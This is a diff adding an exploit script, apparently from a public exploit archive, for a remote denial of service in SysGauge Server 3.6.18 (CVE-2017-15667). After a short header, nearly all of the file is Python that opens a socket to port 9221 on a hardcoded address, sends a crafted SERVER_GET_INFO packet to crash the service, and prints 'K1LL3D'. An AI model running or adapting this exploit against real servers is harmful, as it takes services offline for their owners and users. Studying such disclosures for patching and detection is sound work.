@@ -1,0 +1,41 @@
+# Exploit Title: SysGauge Server 3.6.18 - DOS
+# Date: 2017-10-20
+# Exploit Author: Ahmad Mahfouz
+# Software Link: hhttp://www.sysgauge.com/setups/sysgaugesrv_setup_v3.6.18.exe
+# Version: v3.6.18
+# Category; Windows Remote DOS
+# CVE: CVE-2017-15667
+# Author Homepage: www.unixawy.com
+# Description: SysGauge Server 3.6.18 the Control Protocl suffers from a denial of service. The attack vector is a crafted SERVER_GET_INFO packet sent to control port 9221.
+
+#!/usr/bin/env python
+import socket
+target = "192.168.72.133"
+port = 9221
+s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((target,port))
+packet = "\x75\x19\xba\xab\x03"
+packet +="\x00\x00\x00\x01\x00\x00\x00\x1a"
+packet += "\x00"
+packet += "\x3e"
+packet += "\x00"
+packet += "\x20"
+packet += "\x00"
+packet += "\x00"
+packet += "\x00"
+packet += "\x00\x00\x00\x00"
+packet += "SERVER_GET_INFO"
+packet += "\x02\x32\x01"
+packet += "Data"
+packet += "\x01\x30\x01\x00"
+packet += "\x04\x02\x74"
+packet += "\x18\x18\x00"
+s.send(packet)
+
+try:
+
+         data = s.recv(100)
+
+except:
+
+         print "K1LL3D"
